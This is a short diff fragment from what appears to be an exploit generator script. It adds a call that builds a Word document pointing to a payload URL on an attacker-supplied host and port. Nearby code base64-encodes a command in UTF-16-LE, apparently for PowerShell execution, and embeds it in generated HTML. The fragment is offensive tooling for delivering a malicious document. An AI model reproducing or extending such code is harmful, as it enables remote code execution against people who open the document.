@@ -95,6 +95,8 @@ def __main__():
 
     payload_url = f"http://{args.host}:{args.port}/index.html"
 
+    generate_docx(payload_url, args.output)
+
     parsed_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('utf-8')
 
     generate_html(parsed_command)
